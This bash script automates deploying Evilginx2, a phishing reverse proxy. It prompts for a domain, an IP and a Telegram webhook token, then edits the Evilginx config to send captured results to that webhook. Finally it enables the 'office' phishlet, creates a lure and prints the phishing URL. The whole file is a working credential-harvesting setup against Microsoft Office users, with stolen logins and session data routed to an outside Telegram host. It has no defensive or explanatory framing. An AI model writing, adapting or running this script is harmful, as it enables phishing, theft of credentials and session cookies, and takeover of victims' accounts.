#!/usr/bin/env bash

LOG_FILE="/var/log/evilginx_auto.log"
CONFIG_FILE="/root/.evilginx/config.yaml"

# Function to log messages
log_message() {
    echo "[$(date)] $1" | tee -a "$LOG_FILE"
}

# Prompt for user input
read -p "Enter domain name (e.g., example.com): " DOMAIN
read -p "Enter external IPv4 address: " EXTERNAL_IPV4
read -p "Enter redirect URL (e.g., https://nba.com): " REDIRECT_URL
read -p "Enter Telegram Webhook Token: " TELEGRAM_WEBHOOK

# Ensure `expect` is installed
log_message "[+] Checking if required packages are installed..."
if ! command -v expect &> /dev/null; then
    log_message "[!] 'expect' not found. Installing..."
    sudo apt update && sudo apt install expect -y || { log_message "[!] Failed to install 'expect'!"; exit 1; }
else
    log_message "[+] 'expect' is already installed."
fi

# Update and upgrade system
log_message "[+] Updating system..."
sudo apt update && sudo apt upgrade -y || { log_message "[!] System update failed!"; exit 1; }

# Check if Evilginx is already running and kill it if necessary
if pgrep -x "evilginx2" > /dev/null; then
    log_message "[!] Found a running Evilginx instance. Killing it to prevent duplicates..."
    pkill -f evilginx2
    sleep 3  # Allow process to fully terminate
fi

# First Evilginx Run - Start and Exit Immediately
log_message "[+] Starting Evilginx for the first time and exiting..."
expect <<EOF | tee -a "$LOG_FILE"
    spawn ./evilginx2
    expect "evilginx2 >"
    send "exit\r"
    expect eof
EOF

# Ensure Evilginx fully exits before modifying config
sleep 5  

# Check if the Evilginx config file exists before modifying
if [ -f "$CONFIG_FILE" ]; then
    log_message "[+] Modifying Evilginx config.yaml..."

    # Fix `dns_port` modification to prevent appending extra zeros
    if grep -q "dns_port: 5300" "$CONFIG_FILE"; then
        log_message "[+] dns_port is already set to 5300. No change needed."
    else
        sed -i 's/dns_port: [0-9]\+/dns_port: 5300/' "$CONFIG_FILE"
        log_message "[+] Changed dns_port to 5300"
    fi

    # Modify domain and external IPv4 dynamically based on user input
    sed -i "s|domain: .*|domain: \"$DOMAIN\"|" "$CONFIG_FILE"
    sed -i "s|external_ipv4: .*|external_ipv4: \"$EXTERNAL_IPV4\"|" "$CONFIG_FILE"

    # Remove the `unauth_url` field entirely
    sed -i '/unauth_url:/d' "$CONFIG_FILE"
    log_message "[+] Removed unauth_url from config.yaml"

    # Ensure webhook_telegram is correctly formatted under `general:`
    if grep -q "webhook_telegram:" "$CONFIG_FILE"; then
        sed -i "s|webhook_telegram: .*|webhook_telegram: \"$TELEGRAM_WEBHOOK\"|" "$CONFIG_FILE"
    else
        sed -i "/general:/a \ \ webhook_telegram: \"$TELEGRAM_WEBHOOK\"" "$CONFIG_FILE"
    fi
    log_message "[+] Updated webhook_telegram in config.yaml"

    log_message "[+] Config file modified successfully!"
else
    log_message "[!] Config file not found! Skipping modification."
    exit 1
fi

# Validate YAML syntax before restarting Evilginx
yaml_check=$(python3 -c "import yaml; yaml.safe_load(open('$CONFIG_FILE'))" 2>&1)
if [ $? -ne 0 ]; then
    log_message "[!] YAML Validation Error: $yaml_check"
    exit 1
fi

# Second Evilginx Run - Execute Commands
log_message "[+] Restarting Evilginx and executing commands..."
expect <<EOF | tee -a "$LOG_FILE"
    spawn ./evilginx2
    expect "evilginx2 >"
    send "phishlets hostname office $DOMAIN\r"
    expect "evilginx2 >"
    send "phishlets enable office\r"
    expect "evilginx2 >"
    send "lures create office\r"
    expect "evilginx2 >"
    send "lures edit 0 redirect_url $REDIRECT_URL\r"
    expect "evilginx2 >"
    send "lures get-url 0\r"
    expect "evilginx2 >"
    send "config\r"
    expect "evilginx2 >"
    send "exit\r"
    expect eof
EOF

log_message "[+] Evilginx setup completed successfully!"
